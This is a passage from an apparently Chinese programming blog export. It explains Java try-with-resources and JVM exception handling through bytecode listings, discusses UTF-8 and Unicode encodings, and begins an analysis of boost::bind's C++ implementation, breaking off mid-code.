    <content type="text"><![CDATA[Try with resources这个所谓的try-with-resources，是个语法糖。实际上就是自动调用资源的close()函数。和Python里的with语句差不多。 例如： 12345static String readFirstLineFromFile(String path) throws IOException &#123; try (BufferedReader br = new BufferedReader(new FileReader(path))) &#123; return br.readLine(); &#125;&#125; 可以看到try语句多了个括号，而在括号里初始化了一个BufferedReader。这种在try后面加个括号，再初始化对象的语法就叫try-with-resources。 实际上，相当于下面的代码（其实略有不同，下面会说明）： 12345678static String readFirstLineFromFileWithFinallyBlock(String path) throws IOException &#123; BufferedReader br = new BufferedReader(new FileReader(path)); try &#123; return br.readLine(); &#125; finally &#123; if (br != null) br.close(); &#125;&#125; 很容易可以猜想到，这是编绎器自动在try-with-resources后面增加了判断对象是否为null，如果不为null，则调用close()函数的的字节码。 只有实现了java.lang.AutoCloseable接口，或者java.io.Closable（实际上继随自java.lang.AutoCloseable）接口的对象，才会自动调用其close()函数。有点不同的是java.io.Closable要求一实现者保证close函数可以被重复调用。而AutoCloseable的close()函数则不要求是幂等的。具体可以参考Javadoc。 下面从编绎器生成的字节码来分析下，try-with-resources到底是怎样工作的： 12345678910public class TryStudy implements AutoCloseable&#123; static void test() throws Exception &#123; try(TryStudy tryStudy = new TryStudy())&#123; System.out.println(tryStudy); &#125; &#125; @Override public void close() throws Exception &#123; &#125;&#125; TryStudy实现了AutoCloseable接口，下面来看下test函数的字节码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364static test()V throws java/lang/Exception TRYCATCHBLOCK L0 L1 L2 TRYCATCHBLOCK L3 L4 L4 L5 LINENUMBER 21 L5 ACONST_NULL ASTORE 0 ACONST_NULL ASTORE 1 L3 NEW TryStudy DUP INVOKESPECIAL TryStudy.&lt;init&gt; ()V ASTORE 2 L0 LINENUMBER 22 L0 GETSTATIC java/lang/System.out : Ljava/io/PrintStream; ALOAD 2 INVOKEVIRTUAL java/io/PrintStream.println (Ljava/lang/Object;)V L1 LINENUMBER 23 L1 ALOAD 2 IFNULL L6 ALOAD 2 INVOKEVIRTUAL TryStudy.close ()V GOTO L6 L2 FRAME FULL [java/lang/Throwable java/lang/Throwable TryStudy] [java/lang/Throwable] ASTORE 0 ALOAD 2 IFNULL L7 ALOAD 2 INVOKEVIRTUAL TryStudy.close ()V L7 FRAME CHOP 1 ALOAD 0 ATHROW L4 FRAME SAME1 java/lang/Throwable ASTORE 1 ALOAD 0 IFNONNULL L8 ALOAD 1 ASTORE 0 GOTO L9 L8 FRAME SAME ALOAD 0 ALOAD 1 IF_ACMPEQ L9 ALOAD 0 ALOAD 1 INVOKEVIRTUAL java/lang/Throwable.addSuppressed (Ljava/lang/Throwable;)V L9 FRAME SAME ALOAD 0 ATHROW L6 LINENUMBER 24 L6 FRAME CHOP 2 RETURN LOCALVARIABLE tryStudy LTryStudy; L0 L7 2 MAXSTACK = 2 MAXLOCALS = 3 从字节码里可以看出，的确是有判断tryStudy对象是否为null，如果不是null，则调用close函数进行资源回收。再仔细分析，可以发现有一个Throwable.addSuppressed的调用，那么这个调用是什么呢？ 其实，上面的字节码大概是这个样子的（当然，不完全是这样的，因为汇编的各种灵活的跳转用Java是表达不出来的）： 1234567891011121314151617static void test() throws Exception &#123; TryStudy tryStudy = null; try&#123; tryStudy = new TryStudy(); System.out.println(tryStudy); &#125;catch(Throwable suppressedException) &#123; if (tryStudy != null) &#123; try &#123; tryStudy.close(); &#125;catch(Throwable e) &#123; e.addSuppressed(suppressedException); throw e; &#125; &#125; throw suppressedException; &#125;&#125; 有点晕是吧，其实很简单。使用了try-with-resources语句之后，有可能会出现两个异常，一个是try块里的异常，一个是调用close函数里抛出的异常。当然，平时我们写代码时，没有关注到。一般都是再抛出close函数里的异常，前面的异常被丢弃了。 如果在调用close函数时出现异常，那么前面的异常就被称为Suppressed Exceptions，因此Throwable还有个addSuppressed函数可以把它们保存起来，当用户捕捉到close里抛出的异常时，就可以调用Throwable.getSuppressed函数来取出close之前的异常了。 总结使用try-with-resources的语法可以实现资源的自动回收处理，大大提高了代码的便利性，和mutil catch一样，是个好东东。 用编绎器生成的字节码的角度来看，try-with-resources语法更加高效点。 java.io.Closable接口要求一实现者保证close函数可以被重复调用，而AutoCloseable的close()函数则不要求是幂等的。 参考 http://docs.oracle.com/javase/tutorial/essential/exceptions/tryResourceClose.html http://docs.oracle.com/javase/7/docs/api/java/lang/AutoCloseable.html http://docs.oracle.com/javase/7/docs/api/java/io/Closeable.html]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>exception</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java中异常Exception的实现的一些分析]]></title>
    <url>%2Fjava-exception%2F</url>
    <content type="text"><![CDATA[前言最近发现一个很有用的Eclipse插件：http://andrei.gmxhome.de/bytecode/，可以在Eclipse直接查看，调试Java的字节码。 顺带研究了下Java里异常的实现机制，还有JDK7里的mutil catch的实现原理。 athrow指令在JVM里实现异常的指令是athrow，指令的参考在这里：http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-6.html#jvms-6.5.athrow 大段的英文就不粘贴过来了：）。 个人理解：JVM是基于所谓的栈帧的(stack frame)的，一个函数调用链就是一个个栈帧组成，当在一个栈里用athrow抛出异常时，JVM会搜索当前函数的异常处理表（参考下面的Class文件分析），如果有找到对应的异常处理的handler，则由这个handler来处理。如果没有，则清理当前栈，再回到上一层栈帧中处理。如果一层层栈帧回退，最终都没有找到Exception Handler，则线程终止。 下面贴点实际代码： 一个简单的函数： 1234567891011public void testFunc(int i) throws NamingException, XPathException, SQLException &#123; if (i == 3) &#123; throw new XPathException(""); &#125; if (i == 4) &#123; throw new SQLException(); &#125; if (i == 5) &#123; throw new NamingException(); &#125;&#125; 前面提到的ByteCode插件给出的分析： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// access flags 0x1 public testFunc(I)V throws javax/naming/NamingException javax/xml/xpath/XPathException java/sql/SQLException L0 LINENUMBER 31 L0 ILOAD 1 ICONST_3 IF_ICMPNE L1 L2 LINENUMBER 32 L2 NEW javax/xml/xpath/XPathException DUP LDC "" INVOKESPECIAL javax/xml/xpath/XPathException.&lt;init&gt;(Ljava/lang/String;)V ATHROW L1 LINENUMBER 34 L1 FRAME SAME ILOAD 1 ICONST_4 IF_ICMPNE L3 L4 LINENUMBER 35 L4 NEW java/sql/SQLException DUP INVOKESPECIAL java/sql/SQLException.&lt;init&gt;()V ATHROW L3 LINENUMBER 37 L3 FRAME SAME ILOAD 1 ICONST_5 IF_ICMPNE L5 L6 LINENUMBER 38 L6 NEW javax/naming/NamingException DUP INVOKESPECIAL javax/naming/NamingException.&lt;init&gt;()V ATHROW L5 LINENUMBER 40 L5 FRAME SAME RETURN L7 LOCALVARIABLE this LTest; L0 L7 0 LOCALVARIABLE i I L0 L7 1 MAXSTACK = 3 MAXLOCALS = 2 如果对汇编有一定了解的话，可以很容易看到，在Java里，抛出一个异常真的是非常简单的：先New一个异常对象，再把这个对象的引用放到栈顶，再用athrow指令抛出这个异常。 catch块的实现那下面来看下，从指令层面，是如何处理这个异常的： 首先，处理这个异常的函数： 1234567891011121314public void test() &#123; try &#123; testFunc(100); &#125; catch (NamingException e) &#123; // TODO Auto-generated catch block System.out.println("11111"); &#125; catch (XPathException e) &#123; // TODO Auto-generated catch block System.out.println("22222"); &#125; catch (SQLException e) &#123; // TODO Auto-generated catch block System.out.println("33333"); &#125;&#125; ByteCode插件给出的分析： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// access flags 0x1 public test()V TRYCATCHBLOCK L0 L1 L2 javax/naming/NamingException TRYCATCHBLOCK L0 L1 L3 javax/xml/xpath/XPathException TRYCATCHBLOCK L0 L1 L4 java/sql/SQLException L0 LINENUMBER 44 L0 ALOAD 0 BIPUSH 100 INVOKEVIRTUAL Test.testFunc(I)V L1 LINENUMBER 45 L1 GOTO L5 L2 FRAME SAME1 javax/naming/NamingException ASTORE 1 L6 LINENUMBER 47 L6 GETSTATIC java/lang/System.out : Ljava/io/PrintStream; LDC "11111" INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V L7 GOTO L5 L3 LINENUMBER 48 L3 FRAME SAME1 javax/xml/xpath/XPathException ASTORE 1 L8 LINENUMBER 50 L8 GETSTATIC java/lang/System.out : Ljava/io/PrintStream; LDC "22222" INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V L9 GOTO L5 L4 LINENUMBER 51 L4 FRAME SAME1 java/sql/SQLException ASTORE 1 L10 LINENUMBER 53 L10 GETSTATIC java/lang/System.out : Ljava/io/PrintStream; LDC "33333" INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V L5 LINENUMBER 55 L5 FRAME SAME RETURN L11 LOCALVARIABLE this LTest; L0 L11 0 LOCALVARIABLE e Ljavax/naming/NamingException; L6 L7 1 LOCALVARIABLE e Ljavax/xml/xpath/XPathException; L8 L9 1 LOCALVARIABLE e Ljava/sql/SQLException; L10 L5 1 MAXSTACK = 2 MAXLOCALS = 2 可以看到最开始部分有三条TRYCATCHBLOCK，再分析下这些TRYCATCHBLOCK后面跟着三个标签，最后还有一个异常的名字，再仔细分析下，可以发现三个标签分别对应try块开始的地方，try块结束的地方，catch块开始的地方。这个实际上就是所谓的Execption Table。 class文件格式分析另外，在Class文件的格式里，我们也可以看到Method的Execption Table。可以看出一个条目有四个元素组成： start_pc, end_pc, handler_pc, catch_type。显然这些异常表里的数据是和代码位置有关的，和我们上面看到的一致。 12345678910111213141516Code_attribute &#123; u2 attribute_name_index; u4 attribute_length; u2 max_stack; u2 max_locals; u4 code_length; u1 code[code_length]; u2 exception_table_length; &#123; u2 start_pc; u2 end_pc; u2 handler_pc; u2 catch_type; &#125; exception_table[exception_table_length]; u2 attributes_count; attribute_info attributes[attributes_count];&#125; 所以，我们可以看到，test()函数调用了testFunc()函数，那么，当testFunc()函数里抛出异常时，JVM先回退到test()函数的栈帧，再从Execption Table里查找是否有合适的Execption Hanler，查找首先当前的pc(program counter)要在start_pc, end_pc之间，而且异常的名字要匹配（当然这个应该会被优化成常量的比较，即一个long的比较，不会真的去比较字符串）。如果找到，则跳到对应的handler_pc处继续执行。 finally块的实现下面再来看下Finally块到底是怎么实现的： 在代码里增加finally块： 12345678910111213141516public void test2() &#123; try &#123; testFunc(100); &#125; catch (NamingException e) &#123; // TODO Auto-generated catch block System.out.println("11111"); &#125; catch (XPathException e) &#123; // TODO Auto-generated catch block System.out.println("22222"); &#125; catch (SQLException e) &#123; // TODO Auto-generated catch block System.out.println("33333"); &#125;finally &#123; System.out.println("xxxxxxxxxxxx"); &#125;&#125; ByteCode插件的分析： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990// access flags 0x1 public test2()V TRYCATCHBLOCK L0 L1 L2 javax/naming/NamingException TRYCATCHBLOCK L0 L1 L3 javax/xml/xpath/XPathException TRYCATCHBLOCK L0 L1 L4 java/sql/SQLException TRYCATCHBLOCK L0 L5 L6 TRYCATCHBLOCK L3 L7 L6 TRYCATCHBLOCK L4 L8 L6 L0 LINENUMBER 60 L0 ALOAD 0 BIPUSH 100 INVOKEVIRTUAL Test.testFunc(I)V L1 LINENUMBER 61 L1 GOTO L9 L2 FRAME SAME1 javax/naming/NamingException ASTORE 1 L10 LINENUMBER 63 L10 GETSTATIC java/lang/System.out : Ljava/io/PrintStream; LDC "11111" INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V L5 LINENUMBER 71 L5 GETSTATIC java/lang/System.out : Ljava/io/PrintStream; LDC "xxxxxxxxxxxx" INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V GOTO L11 L3 LINENUMBER 64 L3 FRAME SAME1 javax/xml/xpath/XPathException ASTORE 1 L12 LINENUMBER 66 L12 GETSTATIC java/lang/System.out : Ljava/io/PrintStream; LDC "22222" INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V L7 LINENUMBER 71 L7 GETSTATIC java/lang/System.out : Ljava/io/PrintStream; LDC "xxxxxxxxxxxx" INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V GOTO L11 L4 LINENUMBER 67 L4 FRAME SAME1 java/sql/SQLException ASTORE 1 L13 LINENUMBER 69 L13 GETSTATIC java/lang/System.out : Ljava/io/PrintStream; LDC "33333" INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V L8 LINENUMBER 71 L8 GETSTATIC java/lang/System.out : Ljava/io/PrintStream; LDC "xxxxxxxxxxxx" INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V GOTO L11 L6 LINENUMBER 70 L6 FRAME SAME1 java/lang/Throwable ASTORE 2 L14 LINENUMBER 71 L14 GETSTATIC java/lang/System.out : Ljava/io/PrintStream; LDC "xxxxxxxxxxxx" INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V L15 LINENUMBER 72 L15 ALOAD 2 ATHROW L9 LINENUMBER 71 L9 FRAME SAME GETSTATIC java/lang/System.out : Ljava/io/PrintStream; LDC "xxxxxxxxxxxx" INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V L11 LINENUMBER 73 L11 FRAME SAME RETURN L16 LOCALVARIABLE this LTest; L0 L16 0 LOCALVARIABLE e Ljavax/naming/NamingException; L10 L5 1 LOCALVARIABLE e Ljavax/xml/xpath/XPathException; L12 L7 1 LOCALVARIABLE e Ljava/sql/SQLException; L13 L8 1 MAXSTACK = 2 MAXLOCALS = 3 我们可以很神奇的发现，finally块的代码在每一个catch后面都有一份。也就是说finally的实现有点像内联优化，把代码复制了很多份。 JDK7中mutil catch的实现我们再来看下JDK7新增的mutil catch语法的实现： 1234567public void test3() &#123; try &#123; testFunc(100); &#125; catch (NamingException | XPathException | SQLException e) &#123; e.printStackTrace(); &#125;&#125; ByteCode插件的分析： 12345678910111213141516171819202122232425262728public test3()V TRYCATCHBLOCK L0 L1 L2 javax/naming/NamingException TRYCATCHBLOCK L0 L1 L2 javax/xml/xpath/XPathException TRYCATCHBLOCK L0 L1 L2 java/sql/SQLException L0 LINENUMBER 77 L0 ALOAD 0 BIPUSH 100 INVOKEVIRTUAL Test.testFunc(I)V L1 LINENUMBER 78 L1 GOTO L3 L2 FRAME SAME1 java/lang/Exception ASTORE 1 L4 LINENUMBER 79 L4 ALOAD 1 INVOKEVIRTUAL java/lang/Exception.printStackTrace()V L3 LINENUMBER 81 L3 FRAME SAME RETURN L5 LOCALVARIABLE this LTest; L0 L5 0 LOCALVARIABLE e Ljava/lang/Exception; L4 L3 1 MAXSTACK = 2 MAXLOCALS = 2 我们可以发现，每一个TRYCATCHBLOCK的配置都是一样的，只是异常的名字不一样。所以实际上mutil catch的实现和普通的实现没有太大的区别，当然从JVM的实现角度来看，mutil catch有可能可以优化Exception Handler的查找过程（纯猜测的，如果是线性查找，则效率是一样的）。不过有好处是可以减少class文件的体积，这个也比较有用，因为目前Java的class文件的大小是有限制的。参考这里；http://stackoverflow.com/questions/5497495/maximum-size-of-java-class-exception-table 总结Java中的异常的实现不是什么太神秘的东东，和人们的直觉的实现差不多。任何编程语言的异常机制都会有一定的开销，但是异常如果没有触发，实际上是没有开销的。 异常在触发时，要new一个异常对象，再一层层地栈帧回退，每层都要查找异常处理表，开销还是比较大的。 所在异常只应该用在合适的地方，如果异常像Switch那样用，那就悲剧了。 参考 http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-6.html#jvms-6.5.athrow http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-2.html#jvms-2.10 http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-4.html#jvms-4.7.3 http://andrei.gmxhome.de/bytecode/ 非常有用的分析Java 汇编代码的Eclipse插件]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>exception</tag>
        <tag>asm</tag>
        <tag>bytecode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[扯谈下UTF-8]]></title>
    <url>%2Fabout-utf8%2F</url>
    <content type="text"><![CDATA[前言本来想翻译这篇文章的（作者是utf-8编码，golang发明者之一）： UTF-8: Bits, Bytes, and Benefits: http://research.swtch.com/utf8 一则翻译起来很痛苦，二则觉得这篇文章有些地方可能说得不是太明白，所以结合其它的一些东东扯谈下utf-8。 Unicode先扯谈下Unicode。 Unicode就是为每一个字符（各种语言的各种字符）分配一个数字。所以它实际上是一个表，记录了字符和数字的对应关系。 比如汉字“你”，对应的数字是20320，16进制是4F60。 目前Unicode的范围从 U+0000 到 U+10FFFF 。有UTF-8，UTF-16，UTF-32三种编码方式。 其中UTF-8对应1到4个8-bit，UTF-16对应1到2个16-bit，UTF-32对应1个32-bit。 下面这个表，很清晰地总结了各种编码方式（from: http://www.unicode.org/faq/utf_bom.html ）： Name UTF-8 UTF-16 UTF-16BE UTF-16LE UTF-32 UTF-32BE UTF-32LE Smallest code point 0000 0000 0000 0000 0000 0000 0000 Largest code point 10FFFF 10FFFF 10FFFF 10FFFF 10FFFF 10FFFF 10FFFF Code unit size 8 bits 16 bits 16 bits 16 bits 32 bits 32 bits 32 bits Byte order N/A &lt;BOM&gt; big-endian little-endian &lt;BOM&gt; big-endian little-endian Fewest bytes per character 1 2 2 2 4 4 4 Most bytes per character 4 4 4 4 4 4 4 历史原因因为历史原因，曾经人们以为用两个8-bit，可以表示任意一字符，最初的Unicode标准就是16-bit的。所以Java中的char类型，C++中的wchar_t（gcc当作32-bit），QT中的QString，windows的底层Unicode的支持，都是16-bit的，所以造成了很多悲剧。 wchar_t实际上是个过时的东东，所以在C++11中增加了char16_t和char32_t类型，不过因为各家编译器的实现，标准库的实现，及语法等，实际使用还是相当相当的蛋疼。 这些悲剧一是unicode标准本身很比较晚才成熟，二则C/C++一直没有把unicode支持标准化（所以QT自己搞了一套，微软自己也搞了套）。 不过话说回来，这些悲剧不能全怪C++，只能说Unicode标准本身就蛋疼。据我所认识的编程语言中，只有后来比较晚出现的语言才比较好地支持unicode，比如golang，python3。 http://www.ruanyifeng.com/blog/2014/12/unicode.html Unicode与JavaScript详解 UTF-8上面扯远了，再回来说下UTF-8。 UTF-8的编码规则UTF-8的编码规则可以看阮一锋写的文章：http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html 123456789 Unicode符号范围 | UTF-8编码方式(十六进制) | （二进制）--------------------+---------------------------------------------0000 0000-0000 007F | 0xxxxxxx0000 0080-0000 07FF | 110xxxxx 10xxxxxx0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx下面，还是以汉字“严”为例，演示如何实现UTF-8编码。已知“严”的unicode是4E25（100111000100101），根据上表，可以发现4E25处在第三行的范围内（0000 0800-0000 FFFF），因此“严”的UTF-8编码需要三个字节，即格式是“1110xxxx 10xxxxxx 10xxxxxx”。然后，从“严”的最后一个二进制位开始，依次从后向前填入格式中的x，多出的位补0。这样就得到了，“严”的UTF-8编码是“11100100 10111000 10100101”，转换成十六进制就是E4B8A5。 要注意的是在UTF-8编码中，非ASCII字符的编码字串中不会出现0X00，即’\0’。这个很重要，是UTF-8有很多特性的重要原因。 UTF-8编码的优点UTF-8的编码规则，让它有很多特性： 兼容ASCII。ASCII编码的文件即同时也是UTF-8编码的文件。 可以从二进制数据流中识别出ASCII字符，比如有一个字节是0x7A，那么它肯定是字符’z’，因为它的最高为是0（参见上面的UTF-8的编码规则，所有的非ASCII字符的UTF-8编码的字节的最高位都是1）。 子串搜索可以直接按字节进行搜索，可以使用C语言原有的函数，如strchr，strstr（原因参考上面的UTF-8的编码规则）。 大多数处理8-bit编码文件的程序可以安全地处理utf-8文件（原因参考上一点）。 utf-8编码的顺序和Unicode中码位(code point)的顺序是一致的，所以像unix工具，join，ls，sort等不用显式地指明是utf-8编码。 utf-8编码是没有字节顺序的，UTF-8编码的文件可以不用写BOM头。 像UTF-16或者UTF-32编码的文件就要写入BOM头，否则只能猜测了。（其实，文本编辑器都是读入一段数据，再猜测到底是什么编码。mozilla有个开源程序jChardet，可以猜什么编码，但是实测并不是很准确。对于没有指定编码的网页，浏览器只好去猜测所使用的编码，像chrome浏览器有时就会猜错，貌似错误率比IE要高。） update:2016-05-23貌似这个库是一直更新的，可以用来检测编码，其它的都比较老了。 12345&lt;dependency&gt; &lt;groupId&gt;com.ibm.icu&lt;/groupId&gt; &lt;artifactId&gt;icu4j&lt;/artifactId&gt; &lt;version&gt;57.1&lt;/version&gt;&lt;/dependency&gt; http://stackoverflow.com/questions/499010/java-how-to-determine-the-correct-charset-encoding-of-a-stream utf-8编码的缺点 utf-8编码是好，但是因为它是变长的！所以用一个什么类型来表示一个utf-8字符？ 这个在C++中还是无解，其实在其它的编程语言中同样是无解。至于go语言，它采取了一个折中的办法，在历遍字符串时，得到的是一个rune类型（实际即int32）。 另外，假定有一个大文件，你修改了一个字符，那么有可能整一个文件都有重新保存。。 UTF-16编码尽管也有可能要重新保存整个文件，但是概率比较小，因为大部分常用的字符都可以用一个16-bit来表示。 不能实现O(1)的随机访问 所以像文本编辑器等要内部再用一个数组来记录每一个字符的位置。 不过，像随机访问，这样的操作是很少的。 对于编程语言来说，问题不大，因为大部分编程语言中string都是不要修改的（貌似只有C++中string是可以修改的）。 所以通常只有历遍操作，而历遍操作，对于UTF-8，UTF-16，UTF-32都是O(n)的时间复杂度（当然，如果较真，UTF-32编码要快一些）。 其实上面的缺点，同样是UTF-16编码的缺点（它也是变长的1个16-bit或者2个16-bit），UTF-16编码还有一个重要的缺点是要指明字节序。 UTF-32编码的缺点是要指明字节序和太浪费空间（如果全是ASCII字符，那么要浪费3倍的空间！），UTF-32编码的优点是可以O(1)实现随机访问。 其它的一些东东受Windows API的影响，话说我以前是UTF-16党（wchar_t），但是后来发现它并不是定长的（不能用像s[i]这样的代码来访问一个字符），很伤心，慢慢改为用utf-8编码了，但是utf-8编码不能随机访问，的确也是个问题。 所以现在我是“无-党-派-人-士”:) 。 国外还有人专门做了个网站来推广utf-8编码：http://utf8everywhere.org/ 还有专门吐槽UTF-16的：http://programmers.stackexchange.com/questions/102205/should-utf-16-be-considered-harmful Unicode在线查询的方法 http://en.wikipedia.org/wiki/List_of_Unicode_characters http://www.unicode.org/charts/ 4个byte的utf-8字符串的一些例子： http://en.wikibooks.org/wiki/Unicode/Character_reference/1D000-1DFFF 这里还有一个测试utf-8解码是否正确的测试例子： http://www.cl.cam.ac.uk/~mgk25/ucs/examples/UTF-8-test.txt 这里有一个Unicode编码清单，比较实用： http://witmax.cn/unicode-list.html python3中的unicode在python3中，字符串就是Unicode字符串。在CPython的代码中可以看到，对UTF-8，UTF-16，UTF-32都实现了支持。在创建一个字符串时（比如，解析“print(‘abc中国’)”语句，在cmd窗口下，’abc中国’的编码通常是cp936，即gbk编码），如果是UTF-16或者UTF-32编码，则直接创建一个对应的字符串对象即可。如果是其它编码，则先转换为UTF-8编码，再创建一个字符串对象。 java里如何处理大于U+FFFF（即4byte的UTF-16编码）的字符java里用char来表示一个字符，但是char却不能表示大于U+FFFF的字符，因为char只有两个byte。上面说了java出现时unicode标准还没有成熟，所以这是一个历史遗留问题。 那么如何在java里表示和处理大于U+FFFF的字符？参考这里： http://stackoverflow.com/questions/9834964/char-to-unicode-more-than-uffff-in-java 12// This represents U+10FFFFString x = "\udbff\udfff"; 或者 1String y = new StringBuilder().appendCodePoint(0x10ffff).toString(); 还提供了一些函数来处理，更多的可以直接参考String类的注释。 123||System.out.println(y);||System.out.println("codePoint:" + y.codePointAt(0));||System.out.println("codePoint len:" + y.codePointCount(0, y.length())); update: 2017-4-26 JDK里处理utf8编码的代码：http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/8u40-b25/sun/nio/cs/UTF_8.java?av=f#285 JDK里默认的序列化是如何处理编码的： java.io.ObjectOutputStream.BlockDataOutputStream.writeUTFBody(String) 因为jdk里的String都是utf-16的编码，在这里jdk的序列化做了一点压缩的处理。对于两个char（四个字节）的字符，压缩为3个字节来表示。 hessian里的字符是utf8编码的。参考 http://hessian.caucho.com/doc/hessian-serialization.html 在实现里，可以做一个优化。用unsafe 读出一个long，然后判断是不是全是ansi字符，这样子可以加快速度。 123456789101112131415// fast path for ASCIIint numLongs = toRead &gt;&gt; 3;for (int i =0; i &lt; numLongs; i++) &#123; long currentOffset = baseOffset + _offset; long test = unsafe.getLong(_buffer, currentOffset); if ((test &amp; 0x8080808080808080L) == 0L) &#123; _chunkLength-=8; toRead -= 8; for (int j = 0; j &lt; 8; j++) &#123; _sbuf.append((char)(_buffer[_offset++])); &#125; &#125; else &#123; break; &#125;&#125; 总结鉴于UTF-8编码有这么多优点，UTF-8编码会越来越流行。据google的统计数据，超过50%的网页，是utf-8编码。很多工具默认编码都是UTF-8的，比如python3的解析器，GCC。 通常来说UTF-8编码是优先选择，不过，如果是一些特殊应用，要用到O(1)的随机访问字符串，应该使用UTF-32编码。 参考 UTF-8: Bits, Bytes, and Benefits http://research.swtch.com/utf8 http://www.unicode.org UTF-8, UTF-16, UTF-32 &amp; BOM http://www.unicode.org/faq/utf_bom.html 字符编码笔记：ASCII，Unicode和UTF-8 http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html The Go Programming Language Specification http://golang.org/ref/spec 微软的Unicode的一个文档： http://msdn.microsoft.com/en-us/goglobal/bb688113.aspx]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>utf8</tag>
        <tag>unicode</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[详细解析boost中bind的实现]]></title>
    <url>%2Fcpp-boost-bind%2F</url>
    <content type="text"><![CDATA[写在前面的话在C++11之后，std::bind是C++标准库的一个组件了。一开始想弄个C++11的实现来研究下，发现里面用到了可变参数模板（代码变得非常神奇）. http://llvm.org/svn/llvm-project/libcxx/trunk/include/functional 还是弄个原始点的boost的实现来研究下。 话说网上关于boost::bind的实现的文章也有不少，不过大多数都是贴一段代码，再扯一通，结果到头来什么都没看明白。（起码LZ是。。） 花了一天的功夫，最终从boost::bind的源代码中抠出了可编绎运行的代码。 下面一步一步来解析boost::bind的实现。 标准库中的fouctor和bind1st的实现首先从简单的入手。先看下标准库中的fouctor和bind1st的实现（为了防止和标准库的命名冲突，全部都在命名后面加了2）。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std;template&lt;typename _Arg1, typename _Arg2, typename _Result&gt;struct binary_function2 &#123; typedef _Arg1 first_argument_type; typedef _Arg2 second_argument_type; typedef _Result result_type;&#125;; template&lt;typename _Tp&gt;struct equal_to2: public binary_function2&lt;_Tp, _Tp, bool&gt; &#123; bool operator()(const _Tp&amp; __x, const _Tp&amp; __y) const &#123; return __x == __y; &#125;&#125;; template&lt;typename _Arg, typename _Result&gt;struct unary_function2 &#123; typedef _Arg argument_type; typedef _Result result_type;&#125;; template&lt;typename _Operation&gt;class binder1st2: public unary_function2&lt; typename _Operation::second_argument_type, typename _Operation::result_type&gt; &#123;protected: _Operation op; typename _Operation::first_argument_type value; public: binder1st2(const _Operation&amp; __x, const typename _Operation::first_argument_type&amp; __y) : op(__x), value(__y) &#123; &#125; typename _Operation::result_type operator()( const typename _Operation::second_argument_type&amp; __x) const &#123; return op(value, __x); &#125; typename _Operation::result_type operator()( typename _Operation::second_argument_type&amp; __x) const &#123; return op(value, __x); &#125;&#125;; template&lt;typename _Operation, typename _Tp&gt;inline binder1st2&lt;_Operation&gt; bind1st2(const _Operation&amp; __fn, const _Tp&amp; __x) &#123; typedef typename _Operation::first_argument_type _Arg1_type; return binder1st2&lt;_Operation&gt;(__fn, _Arg1_type(__x));&#125; int main() &#123; binder1st2&lt;equal_to2&lt;int&gt; &gt; equal_to_10(equal_to2&lt;int&gt;(), 10); int numbers[] = &#123; 10, 20, 30, 40, 50, 10 &#125;; int cx; cx = std::count_if(numbers, numbers + 6, bind1st(equal_to2&lt;int&gt;(), 10)); cout &lt;&lt; "There are " &lt;&lt; cx &lt;&lt; " elements that are equal to 10.\n";&#125; 上面的实现还是比较简单的，希望还没有看晕。:) 从代码可以看出binder1st的实现，实制上是把参数保存起来，等到调用时，再取出来使用。 boost::bind从原理上来说，也是这么回事，但是要复杂得多。 解析简化版bind2下面是从boost::bind源码中抠出来的，一个简单的bind的实现（bind改为bind2），主流编译器应该都可以编统执行。 为了方便理解程序运行过程，代码中增加了一些cout输出。 myBind.h： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274#ifndef BOOST_BIND_BIND_HPP_INCLUDED__Mybind#define BOOST_BIND_BIND_HPP_INCLUDED__Mybind #include &lt;iostream&gt;using namespace std;namespace boost &#123;template&lt;class T&gt; struct is_placeholder &#123; enum _vt &#123; value = 0 &#125;;&#125;;template&lt;int I&gt; struct arg &#123; arg() &#123; &#125;&#125;;template&lt;class T&gt;struct type &#123;&#125;;namespace _bi // implementation details&#123; template&lt;class A1&gt; struct storage1 &#123; explicit storage1(A1 a1) : a1_(a1) &#123; cout&lt;&lt;"storage1 storage1(A1 a1)"&lt;&lt;endl; &#125; A1 a1_;&#125;;template&lt;int 